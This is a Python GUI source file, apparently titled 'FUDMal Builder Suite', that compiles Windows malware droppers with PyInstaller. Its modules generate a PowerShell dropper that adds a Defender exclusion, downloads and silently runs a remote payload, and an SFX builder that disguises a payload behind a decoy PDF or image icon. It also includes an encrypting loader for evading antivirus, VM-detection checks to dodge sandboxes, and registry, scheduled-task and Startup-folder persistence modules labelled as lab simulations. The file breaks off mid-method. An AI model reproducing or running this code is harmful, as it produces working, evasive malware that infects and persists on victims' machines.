import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import textwrap
import tempfile
import sys
import subprocess
import shutil
import base64
import hashlib
import time
import threading
import contextlib
import winreg # Required for the VM check logic context
from datetime import datetime
from PIL import Image

# =============================================================================
# SHARED RESOURCES & TEMPLATES
# =============================================================================

# 1. VM Detection Function (Shared across all modules)
VM_CHECK_CODE = textwrap.dedent("""\
import subprocess
import os
import winreg
import platform
import sys
import time

def is_running_on_vmware_windows():
    if platform.system() != "Windows":
        return False
        
    # --- Check 1: WMI Artifacts (System/Hardware Names) ---
    try:
        command = 'wmic csproduct get Vendor,Name /value'
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=3)
        output = result.stdout.strip().lower()
        
        vm_indicators = ["vmware", "virtualbox", "virtual machine", "qemu", "hyper-v"]
        
        for indicator in vm_indicators:
            if indicator in output:
                return True
    except:
        pass
        
    # --- Check 2: VMware Tools Registry Key ---
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\VMware, Inc.\\VMware Tools"):
            return True
    except FileNotFoundError:
        pass
    except:
        pass

    # --- Check 3: Process List Artifacts ---
    try:
        vm_processes = ["vmtoolsd.exe", "VBoxService.exe", "vmacthlp.exe", "VMSrvc.exe"]
        command = 'tasklist /nh' 
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=3)
        output = result.stdout.strip().lower()

        for process in vm_processes:
            if process in output:
                return True
    except:
        pass
        
    # --- Check 4: File System Artifacts (VM Tools Directory) ---
    vmware_tools_path = r"C:\\Program Files\\VMware\\VMware Tools"
    if os.path.exists(vmware_tools_path):
        return True

    return False
""")

# 2. PowerShell Script Template (For Tab 1)
PS_TEMPLATE = textwrap.dedent("""\
# Parameters derived from configuration:
$URL = '{URL}'
$DIR = '{DOWNLOAD_PATH}'
$PAYLOAD_NAME = '{FILENAME}'
$DELAY_START = {DELAY_START}
$DELAY_WAIT = {DELAY_WAIT}
$DOWNLOAD_DIR = [System.IO.Path]::Combine($env:USERPROFILE,$DIR)

Write-Host "Executing initial delay of $DELAY_START seconds..."
Start-Sleep -Seconds $DELAY_START

if (-not (Test-Path $DOWNLOAD_DIR)) {{
    New-Item -Path $DOWNLOAD_DIR -ItemType Directory | Out-Null
    Write-Host "Created directory: $DOWNLOAD_DIR"
}}

$FinalFilePath = Join-Path $DOWNLOAD_DIR $PAYLOAD_NAME
Add-MpPreference -ExclusionPath $FinalFilePath

Write-Host "Downloading content from $URL to $TempDownloadFile"
Invoke-WebRequest -Uri $URL -OutFile $FinalFilePath

Write-Host "Waiting for $DELAY_WAIT seconds after download..."
Start-Sleep -Seconds $DELAY_WAIT

Write-Host "Starting final process: $FinalFilePath"
Add-MpPreference -ExclusionPath $FinalFilePath
Start-Process -FilePath $FinalFilePath -NoNewWindow
""")

# 3. PowerShell Executor Function (For Tab 1)
PS_EXEC_FUNCTION = textwrap.dedent("""\
def execute_powershell_script(ps_content, delay_start):
    # Local imports ensure the function has everything it needs
    import time
    import base64
    import subprocess
    import sys
    
    try:
        time.sleep(delay_start)

        # 1. Encode the payload
        ps_script_bytes = ps_content.encode('utf-16le')
        ps_b64 = base64.b64encode(ps_script_bytes).decode('utf-8')
        
        # 2. Construct command (Using list format is safer than shell=True)
        cmd = [
            "powershell.exe", 
            "-ExecutionPolicy", "Bypass", 
            "-NoProfile", 
            "-WindowStyle", "Hidden", 
            "-EncodedCommand", ps_b64
        ]

        # 3. Execute
        # 0x08000000 is the raw value for CREATE_NO_WINDOW (hides the console)
        subprocess.run(cmd, timeout=600, creationflags=0x08000000)
        return True

    except Exception as e:
        # DEBUGGING: Write error to a file so you can see what went wrong
        try:
            with open("error_log.txt", "w") as f:
                f.write(f"Execution Failed: {str(e)}")
        except:
            pass
        return False
""")

# =============================================================================
# LOGGING UTILITY
# =============================================================================

class IORedirector:
    """Redirects stdout/stderr to a specific Tkinter Text widget."""
    def __init__(self, text_widget):
        self.text_widget = text_widget

    def write(self, s):
        try:
            self.text_widget.insert(tk.END, s)
            self.text_widget.see(tk.END)
        except:
            pass # Widget might be destroyed

    def flush(self):
        pass

# =============================================================================
# BUILDER LOGIC CLASSES
# =============================================================================

class LogicConfigGen:
    @staticmethod
    def generate(url, download_path, filename, delay_start, delay_wait, enable_vm, output_exe, log_widget):
        # Redirect output
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        
        print("[INFO] Generating PowerShell Config Dropper...")

        # Format PS Content
        ps_content = PS_TEMPLATE.format(
            URL=url, DOWNLOAD_PATH=download_path, FILENAME=filename,
            DELAY_START=delay_start, DELAY_WAIT=delay_wait
        )

        # Logic Construction
        # We prepare the logic block, but we DON'T indent it here yet.
        if enable_vm:
            core_logic = textwrap.dedent(f"""\
if is_running_on_vmware_windows():
    sys.exit(0)
else:
    execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
""")
        else:
            core_logic = textwrap.dedent(f"""\
execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
""")

        # Assemble Full Script
        # CRITICAL FIX: We use textwrap.indent() to push core_logic 8 spaces to the right
        # so it aligns correctly under 'if platform.system() == "Windows":'
        full_script = textwrap.dedent(f"""
{VM_CHECK_CODE}
{PS_EXEC_FUNCTION}

# --- TEMPLATE VARIABLES ---
PS_SCRIPT_CONTENT = '''{ps_content.replace("'", "\\'")}'''
EXECUTION_DELAY = {delay_start}

if __name__ == "__main__":
    if platform.system() == "Windows":
{textwrap.indent(core_logic, "        ")}
    else:
        sys.exit(0)
""")

        # Compilation
        temp_dir = tempfile.mkdtemp()
        temp_py_file = os.path.join(temp_dir, "temp_runner.py")
        
        try:
            with open(temp_py_file, 'w', encoding='utf-8') as f:
                f.write(full_script)
            
            output_dir = os.path.dirname(output_exe)
            exe_name = os.path.basename(output_exe)
            
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', exe_name,
                '--distpath', output_dir, temp_py_file
            ]
            
            print(f"[INFO] Running PyInstaller... Output: {output_exe}")
            
            # Using text=True so we can read stderr if it fails
            process = subprocess.run(cmd, capture_output=True, text=True) 
            
            if process.returncode == 0:
                print(f"[SUCCESS] Executable created: {output_exe}")
                messagebox.showinfo("Success", f"Executable created at:\n{output_exe}")
            else:
                # Print the actual error from PyInstaller
                print(f"[ERROR] PyInstaller Failed:\n{process.stderr[-1000:]}")
                messagebox.showerror("Error", f"Compilation failed.\nCheck log for details.")
            
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            # Cleanup local build artifacts
            spec = os.path.join(output_dir, exe_name.replace('.exe','.spec')) # Spec is usually in CWD or dist
            if os.path.exists(exe_name.replace('.exe','.spec')): os.remove(exe_name.replace('.exe','.spec'))
            if os.path.exists('build'): shutil.rmtree('build')

class LogicSFX:
    @staticmethod
    def create_executor(payload_name, decoy_name, temp_dir, enable_vm):
        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = "    if is_running_on_vmware_windows(): return" if enable_vm else ""
        
        script_content = f'''
import os
import subprocess
import tempfile
import sys
import shutil
import platform
import winreg # Needed for VM check if enabled

{vm_code}

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def execute_payload():
{vm_call}

    DECOY_NAME = "{decoy_name}"
    PAYLOAD_NAME = "{payload_name}"

    try:
        # Use user's temp directory for better permissions
        temp_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 'pdf_decoy')
        os.makedirs(temp_dir, exist_ok=True)

        bundled_decoy_path = get_resource_path(DECOY_NAME)
        bundled_payload_path = get_resource_path(PAYLOAD_NAME)

        decoy_path_out = os.path.join(temp_dir, DECOY_NAME)
        payload_path_out = os.path.join(temp_dir, PAYLOAD_NAME)

        shutil.copy2(bundled_decoy_path, decoy_path_out)
        shutil.copy2(bundled_payload_path, payload_path_out)
        
        # Execute the payload silently
        if sys.platform.startswith('win'):
            subprocess.Popen([payload_path_out], creationflags=subprocess.DETACHED_PROCESS)
        else:
            subprocess.Popen([payload_path_out])

        # Open the decoy file to distract the user
        if sys.platform.startswith('win'):
            os.startfile(decoy_path_out)
        elif sys.platform.startswith('linux'):
            subprocess.Popen(['xdg-open', decoy_path_out])
        else:
            subprocess.Popen(['open', decoy_path_out])
            
    except Exception as e:
        pass # Fail silently
        
    finally:
        pass # Omit cleanup for simplicity in the executor script

if __name__ == '__main__':
    execute_payload()
'''
        path = os.path.join(temp_dir, "payload_executor.py")
        with open(path, 'w') as f: f.write(script_content)
        return path

    @staticmethod
    def build(payload_path, decoy_path, output_name, output_dir, enable_vm, log_widget, is_pdf_mode=False):
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        
        print(f"[INFO] Starting {'PDF ' if is_pdf_mode else ''}SFX Build...")
        
        try:
            temp_dir = tempfile.mkdtemp()
            payload_name = os.path.basename(payload_path)
            decoy_name = os.path.basename(decoy_path)
            
            # Icon Handling
            icon_path = os.path.join(temp_dir, "app_icon.ico")
            if is_pdf_mode:
                # Expecting pdf.ico in CWD
                local_ico = os.path.join(os.getcwd(), "pdf.ico")
                if not os.path.exists(local_ico):
                    print("[ERROR] pdf.ico not found in current directory!")
                    messagebox.showerror("Error", "pdf.ico missing.")
                    return
                shutil.copy2(local_ico, icon_path)
            else:
                # Generate from decoy image
                try:
                    img = Image.open(decoy_path)
                    img.save(icon_path, format="ICO", sizes=[(32,32), (64,64), (256,256)])
                except Exception as e:
                    print(f"[WARN] Could not gen icon from decoy, using default. Error: {e}")
            
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name = os.path.splitext(final_name)[0]
            
            # Generate Executor
            script_path = LogicSFX.create_executor(payload_name, decoy_name, temp_dir, enable_vm)
            
            # Copy files
            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
            shutil.copy2(decoy_path, os.path.join(temp_dir, decoy_name))
            
            sep = ';' if sys.platform.startswith('win') else ':'
            cmd = [
                "pyinstaller", "--onefile", "--windowed",
                f"--icon={icon_path}",
                f"--name={base_name}",
                f"--add-data", f"{payload_name}{sep}.",
                f"--add-data", f"{decoy_name}{sep}.",
                script_path
            ]
            
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            
            # Move Result
            dist_exe = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            
            print(f"[SUCCESS] Dropper created: {final_dest}")
            messagebox.showinfo("Success", f"Created: {final_dest}")

        except Exception as e:
            print(f"[ERROR] {e}")
            messagebox.showerror("Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

class LogicObfuscator:
    @staticmethod
    def encode_bytes(data: bytes, version_key: str) -> bytes:
        hash_object = hashlib.sha256(version_key.encode('utf-8'))
        hash_bytes = hash_object.digest()
        key_values = [b % 64 for b in hash_bytes[:8]]
        
        byte_values = list(data)
        pipe = len(key_values)
        num_iterations = pipe
        master_sign = 1 # encode
        
        for i in range(num_iterations):
            next_byte_values = []
            internal_sign = (-1) ** i
            for j in range(len(byte_values)):
                current_byte = byte_values[j]
                key_index = (j + i) % pipe
                shift = key_values[key_index] * internal_sign * master_sign
                next_byte_values.append((current_byte + shift) % 256)
            byte_values = next_byte_values
        return bytes(byte_values)

    @staticmethod
    def build(exe_path, version_key, output_name, output_dir, enable_vm, log_widget):
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        
        print("[INFO] Starting Obfuscation Build...")
        
        try:
            with open(exe_path, 'rb') as f:
                raw_data = f.read()
            
            print(f"[INFO] Encrypting {len(raw_data)} bytes...")
            enc_data = LogicObfuscator.encode_bytes(raw_data, version_key)
            b64_payload = base64.b64encode(enc_data).decode('utf-8')
            
            vm_code = VM_CHECK_CODE if enable_vm else ""
            vm_call = "    if is_running_on_vmware_windows(): return" if enable_vm else ""
            
            loader_code = textwrap.dedent(f"""
import os, sys, subprocess, tempfile, hashlib, base64, platform, winreg
{vm_code}

def generate_key_values(version_key):
    hash_object = hashlib.sha256(version_key.encode('utf-8'))
    hash_bytes = hash_object.digest()
    return [b % 64 for b in hash_bytes[:8]]

def _process_bytes(data: bytes, processing_values: list, mode: str) -> bytes:
    byte_values = list(data)
    pipe = len(processing_values)
    master_sign = 1 if mode == 'encode' else -1
    for i in range(pipe):
        next_vals = []
        internal_sign = (-1) ** i
        for j in range(len(byte_values)):
            curr = byte_values[j]
            k_idx = (j + i) % pipe
            shift = processing_values[k_idx] * internal_sign * master_sign
            next_vals.append((curr + shift) % 256)
        byte_values = next_vals
    return bytes(byte_values)

def decode_bytes(data, key):
    kv = generate_key_values(key)
    return _process_bytes(data, kv, 'decode')

KEY = "{version_key}"
PAYLOAD = "{b64_payload}"

def run():
{vm_call}
    try:
        enc = base64.b64decode(PAYLOAD)
        orig = decode_bytes(enc, KEY)
        temp_dir = tempfile.gettempdir()
        t_path = os.path.join(temp_dir, 'run_' + str(os.getpid()) + '.exe')
        with open(t_path, 'wb') as f: f.write(orig)
        subprocess.run([t_path] + sys.argv[1:])
        try: os.remove(t_path)
        except: pass
    except: pass

if __name__ == "__main__":
    run()
""")
            temp_loader = os.path.join(os.getcwd(), "temp_loader.py")
            with open(temp_loader, 'w', encoding='utf-8') as f:
                f.write(loader_code)
                
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', final_name,
                '--distpath', output_dir, temp_loader
            ]
            
            print("[INFO] Compiling Loader...")
            subprocess.run(cmd, check=True, capture_output=True)
            
            print(f"[SUCCESS] Encrypted Loader created at {os.path.join(output_dir, final_name)}")
            messagebox.showinfo("Success", "Obfuscation Complete.")
            
        except Exception as e:
            print(f"[ERROR] {e}")
            messagebox.showerror("Error", str(e))
        finally:
            if os.path.exists("temp_loader.py"): os.remove("temp_loader.py")
            if os.path.exists("build"): shutil.rmtree("build")
            spec = final_name.replace('.exe', '.spec')
            if os.path.exists(spec): os.remove(spec)

# =============================================================================
# SIMULATION CLASSES  (added below LogicObfuscator)
# =============================================================================

class LogicRegistryPersistence:
    """Simulates MITRE ATT&CK T1547.001 – Registry Run Keys.

    Generates a compiled exe that, when run in the lab:
      1. Stages the bundled payload to %APPDATA%\\SimLab\\
      2. Writes HKCU\\...\\CurrentVersion\\Run pointing to it
      3. Displays a detailed simulation report popup
      4. Optionally removes the key (cleanup mode)
    """

    @staticmethod
    def build(payload_path, key_name, output_name, output_dir,
              enable_vm, enable_cleanup, log_widget):
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        print("[INFO] Starting Registry Persistence Simulator Build...")
        print("[INFO] Technique: MITRE ATT&CK T1547.001 - Registry Run Keys")

        payload_name = os.path.basename(payload_path)
        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = (
            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
            if enable_vm else ""
        )
        cleanup = (
            """\
    # --- CLEANUP: remove Run key ---
    _reg_c = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, _reg_c, 0, winreg.KEY_WRITE) as _hk:
            winreg.DeleteValue(_hk, REG_VALUE_NAME)
        lines.append("[CLEANUP] Run key '" + REG_VALUE_NAME + "' deleted.")
    except Exception as _exc:
        lines.append("[CLEANUP ERROR] " + str(_exc))
"""
            if enable_cleanup else ""
        )

        script_content = f"""import os, sys, shutil, tempfile, platform, winreg
import tkinter as tk
from tkinter import messagebox
{vm_code}
PAYLOAD_FILENAME = "{payload_name}"
REG_VALUE_NAME   = "{key_name}"

def _res(p):
    try:
        return os.path.join(sys._MEIPASS, p)
    except AttributeError:
        return os.path.join(os.path.abspath("."), p)

def _report(body):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Sim -- T1547.001 Run Key", body)
    root.destroy()

def run_simulation():
{vm_call}
    if platform.system() != "Windows":
        _report("[ERROR] Windows-only simulation.")
        return
    lines = [
        "[SIM] Registry Run Key Persistence Simulator",
        "[SIM] Technique: MITRE ATT&CK T1547.001",
        "-" * 60,
    ]
    dest_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "SimLab")
    os.makedirs(dest_dir, exist_ok=True)
    dest_payload = os.path.join(dest_dir, PAYLOAD_FILENAME)
    try:
        shutil.copy2(_res(PAYLOAD_FILENAME), dest_payload)
        lines.append("[STEP 1] Payload staged: " + dest_payload)
    except Exception as _e:
        lines.append("[ERROR] Stage failed: " + str(_e))
        dest_payload = _res(PAYLOAD_FILENAME)
    _reg = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, _reg, 0, winreg.KEY_WRITE) as _hk:
            winreg.SetValueEx(_hk, REG_VALUE_NAME, 0, winreg.REG_SZ, dest_payload)
        lines.append("[STEP 2] Registry Run key set:")
        lines.append("  HKCU\\\\" + _reg + "\\\\" + REG_VALUE_NAME)
        lines.append("  Value: " + dest_payload)
        lines.append("[NOTE] Payload executes at next user logon.")
    except Exception as _e:
        lines.append("[ERROR] Registry write failed: " + str(_e))
{cleanup}
    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")

if __name__ == "__main__":
    run_simulation()
"""
        temp_dir = tempfile.mkdtemp()
        script_path = os.path.join(temp_dir, "reg_persist_sim.py")
        try:
            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
            with open(script_path, 'w', encoding='utf-8') as fh:
                fh.write(script_content)
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name  = os.path.splitext(final_name)[0]
            sep = ';' if sys.platform.startswith('win') else ':'
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', base_name,
                '--add-data', payload_name + sep + '.',
                script_path,
            ]
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            print(f"[SUCCESS] Simulator created: {final_dest}")
            messagebox.showinfo("Success", f"Created: {final_dest}")
        except Exception as e:
            print(f"[ERROR] {e}")
            messagebox.showerror("Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)


class LogicScheduledTask:
    """Simulates MITRE ATT&CK T1053.005 – Scheduled Task/Job.

    Generates a compiled exe that, when run in the lab:
      1. Stages the bundled payload to %APPDATA%\\SimLab\\
      2. Creates a scheduled task via 'schtasks /Create' (ONLOGON or DAILY)
      3. Displays a detailed simulation report popup
      4. Optionally deletes the task (cleanup mode)
    """

    @staticmethod
    def build(payload_path, task_name, trigger, output_name, output_dir,
              enable_vm, enable_cleanup, log_widget):
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        print("[INFO] Starting Scheduled Task Simulator Build...")
        print("[INFO] Technique: MITRE ATT&CK T1053.005 - Scheduled Task/Job")

        payload_name  = os.path.basename(payload_path)
        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = (
            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
            if enable_vm else ""
        )
        cleanup = (
            """\
    # --- CLEANUP: delete the scheduled task ---
    try:
        _del = subprocess.run(
            ["schtasks", "/Delete", "/TN", TASK_NAME, "/F"],
            capture_output=True, text=True,
        )
        if _del.returncode == 0:
            lines.append("[CLEANUP] Task '" + TASK_NAME + "' deleted.")
        else:
            lines.append("[CLEANUP ERROR] " + _del.stderr.strip())
    except Exception as _exc:
        lines.append("[CLEANUP ERROR] " + str(_exc))
"""
            if enable_cleanup else ""
        )
        trigger_upper = trigger.upper()

        script_content = f"""import os, sys, shutil, tempfile, platform, subprocess
import tkinter as tk
from tkinter import messagebox
{vm_code}
PAYLOAD_FILENAME = "{payload_name}"
TASK_NAME        = "{task_name}"
TRIGGER          = "{trigger_upper}"

def _res(p):
    try:
        return os.path.join(sys._MEIPASS, p)
    except AttributeError:
        return os.path.join(os.path.abspath("."), p)

def _report(body):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Sim -- T1053.005 Scheduled Task", body)
    root.destroy()

def run_simulation():
{vm_call}
    if platform.system() != "Windows":
        _report("[ERROR] Windows-only simulation.")
        return
    lines = [
        "[SIM] Scheduled Task Persistence Simulator",
        "[SIM] Technique: MITRE ATT&CK T1053.005",
        "-" * 60,
    ]
    dest_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "SimLab")
    os.makedirs(dest_dir, exist_ok=True)
    dest_payload = os.path.join(dest_dir, PAYLOAD_FILENAME)
    try:
        shutil.copy2(_res(PAYLOAD_FILENAME), dest_payload)
        lines.append("[STEP 1] Payload staged: " + dest_payload)
    except Exception as _e:
        lines.append("[ERROR] Stage failed: " + str(_e))
        dest_payload = _res(PAYLOAD_FILENAME)
    if TRIGGER == "ONLOGON":
        _cmd = ["schtasks", "/Create", "/TN", TASK_NAME,
                "/TR", dest_payload, "/SC", "ONLOGON", "/F"]
    else:
        _cmd = ["schtasks", "/Create", "/TN", TASK_NAME,
                "/TR", dest_payload, "/SC", "DAILY", "/ST", "09:00", "/F"]
    try:
        _r = subprocess.run(_cmd, capture_output=True, text=True)
        if _r.returncode == 0:
            lines.append("[STEP 2] Scheduled task created:")
            lines.append("  Name:    " + TASK_NAME)
            lines.append("  Trigger: /SC " + TRIGGER)
            lines.append("  Command: " + dest_payload)
            lines.append("[NOTE] Task executes payload per the defined schedule.")
        else:
            lines.append("[ERROR] schtasks failed: " + _r.stderr.strip())
    except Exception as _e:
        lines.append("[ERROR] " + str(_e))
{cleanup}
    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")

if __name__ == "__main__":
    run_simulation()
"""
        temp_dir = tempfile.mkdtemp()
        script_path = os.path.join(temp_dir, "schtask_sim.py")
        try:
            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
            with open(script_path, 'w', encoding='utf-8') as fh:
                fh.write(script_content)
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name  = os.path.splitext(final_name)[0]
            sep = ';' if sys.platform.startswith('win') else ':'
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', base_name,
                '--add-data', payload_name + sep + '.',
                script_path,
            ]
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            print(f"[SUCCESS] Simulator created: {final_dest}")
            messagebox.showinfo("Success", f"Created: {final_dest}")
        except Exception as e:
            print(f"[ERROR] {e}")
            messagebox.showerror("Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)


class LogicStartupFolder:
    """Simulates MITRE ATT&CK T1547.001 via the Windows Startup Folder.

    Generates a compiled exe that, when run in the lab:
      1. Resolves the current-user Startup folder path
      2. Copies the bundled payload into that folder
      3. Displays a detailed simulation report popup
      4. Optionally removes the file (cleanup mode)
    """

    @staticmethod
    def build(payload_path, output_name, output_dir,
              enable_vm, enable_cleanup, log_widget):
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        print("[INFO] Starting Startup Folder Simulator Build...")
        print("[INFO] Technique: MITRE ATT&CK T1547.001 - Startup Folder")

        payload_name = os.path.basename(payload_path)
        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = (
            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
            if enable_vm else ""
        )
        cleanup = (
            """\
    # --- CLEANUP: remove payload from Startup folder ---
    _dest_c = os.path.join(startup_dir, PAYLOAD_FILENAME)
    try:
        if os.path.exists(_dest_c):
            os.remove(_dest_c)
        lines.append("[CLEANUP] Removed: " + _dest_c)
    except Exception as _exc:
        lines.append("[CLEANUP ERROR] " + str(_exc))
"""
            if enable_cleanup else ""
        )

        script_content = f"""import os, sys, shutil, tempfile, platform
import tkinter as tk
from tkinter import messagebox
{vm_code}
PAYLOAD_FILENAME = "{payload_name}"

def _res(p):
    try:
        return os.path.join(sys._MEIPASS, p)
    except AttributeError:
        return os.path.join(os.path.abspath("."), p)

def _report(body):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Sim -- T1547.001 Startup Folder", body)
    root.destroy()

def run_simulation():
{vm_call}
    if platform.system() != "Windows":
        _report("[ERROR] Windows-only simulation.")
        return
    lines = [
        "[SIM] Startup Folder Persistence Simulator",
        "[SIM] Technique: MITRE ATT&CK T1547.001 (Startup Folder)",
        "-" * 60,
    ]
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
    )
    lines.append("[STEP 1] Startup folder: " + startup_dir)
    dest_path = os.path.join(startup_dir, PAYLOAD_FILENAME)
    try:
        shutil.copy2(_res(PAYLOAD_FILENAME), dest_path)
        lines.append("[STEP 2] Payload copied to startup folder:")
        lines.append("         " + dest_path)
        lines.append("[NOTE] Payload executes automatically at next user logon.")
    except Exception as _e:
        lines.append("[ERROR] Copy failed: " + str(_e))
{cleanup}
    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")

if __name__ == "__main__":
    run_simulation()
"""
        temp_dir = tempfile.mkdtemp()
        script_path = os.path.join(temp_dir, "startup_sim.py")
        try:
            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
            with open(script_path, 'w', encoding='utf-8') as fh:
                fh.write(script_content)
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name  = os.path.splitext(final_name)[0]
            sep = ';' if sys.platform.startswith('win') else ':'
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', base_name,
                '--add-data', payload_name + sep + '.',
                script_path,
            ]
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            print(f"[SUCCESS] Simulator created: {final_dest}")
            messagebox.showinfo("Success", f"Created: {final_dest}")
        except Exception as e:
            print(f"[ERROR] {e}")
            messagebox.showerror("Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)


# =============================================================================
# MAIN GUI APPLICATION
# =============================================================================

class UnifiedBuilderApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("FUDMal Builder Suite")
        self.geometry("920x800")
        self.configure(bg='#1A1A1A')
        
        self.style = ttk.Style(self)
        self.style.theme_use('clam')
        self._configure_styles()
        
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Initialize Tabs
        self.init_config_tab()
        self.init_sfx_tab()
        self.init_obfus_tab()
        self.init_pdf_tab()
        self.init_reg_persist_tab()
        self.init_schtask_tab()
        self.init_startup_tab()

    def _configure_styles(self):
        self.style.configure('.', background='#1A1A1A', foreground='#22C55E')
        self.style.configure('TFrame', background='#1A1A1A')
        self.style.configure('TLabel', background='#1A1A1A', foreground='#E0E0E0', font=('Consolas', 10))
        self.style.configure('TEntry', background='#333', foreground='#E0E0E0', fieldbackground='#333')
        self.style.configure('TCheckbutton', background='#1A1A1A', foreground='#E0E0E0', font=('Consolas', 10))
        self.style.map('TCheckbutton', background=[('active', '#1A1A1A')])
        self.style.configure('TButton', background='#0052CC', foreground='#FFF', font=('Consolas', 11, 'bold'), borderwidth=0)
        self.style.map('TButton', background=[('active', '#0040A0')], foreground=[('active', '#FFF')])
        self.style.configure('TNotebook', background='#1A1A1A', borderwidth=0)
        self.style.configure('TNotebook.Tab', background='#333', foreground='#E0E0E0', padding=[10, 5], font=('Consolas', 10, 'bold'))
        self.style.map('TNotebook.Tab', background=[('selected', '#22C55E')], foreground=[('selected', '#1A1A1A')])

    # --- SHARED WIDGET HELPERS ---
    def add_label_entry(self, parent, text, default="", width=None):
        f = ttk.Frame(parent)
        f.pack(fill='x', pady=5)
        ttk.Label(f, text=text, width=25).pack(side=tk.LEFT, anchor='w')
        var = tk.StringVar(value=default)
        e = ttk.Entry(f, textvariable=var, width=width or 50)
        e.pack(side=tk.LEFT, fill='x', expand=True, padx=5)
        return var

    def add_file_selector(self, parent, text, is_dir=False, filetypes=None):
        f = ttk.Frame(parent)
        f.pack(fill='x', pady=5)
        ttk.Label(f, text=text, width=25).pack(side=tk.LEFT, anchor='w')
        var = tk.StringVar()
        e = ttk.Entry(f, textvariable=var)
        e.pack(side=tk.LEFT, fill='x', expand=True, padx=5)
        
        def browse():
            if is_dir:
                res = filedialog.askdirectory()
            else:
                res = filedialog.askopenfilename(filetypes=filetypes)
            if res: var.set(res)
            
        btn_txt = "Dir" if is_dir else "File"
        ttk.Button(f, text=btn_txt, command=browse, width=8).pack(side=tk.LEFT)
        return var

    def add_label_combobox(self, parent, text, values, default=None):
        f = ttk.Frame(parent)
        f.pack(fill='x', pady=5)
        ttk.Label(f, text=text, width=25).pack(side=tk.LEFT, anchor='w')
        var = tk.StringVar(value=default or values[0])
        cb = ttk.Combobox(f, textvariable=var, values=values, state='readonly', width=20)
        cb.pack(side=tk.LEFT, padx=5)
        return var

    def create_log_area(self, parent):
        ttk.Label(parent, text="Process Log:", foreground='#888').pack(pady=(10,0), anchor='w')
        f = ttk.Frame(parent)
        f.pack(fill='both', expand=True)
        t = tk.Text(f, height=10, bg='#222', fg='#0F0', font=('Consolas', 9), bd=0)
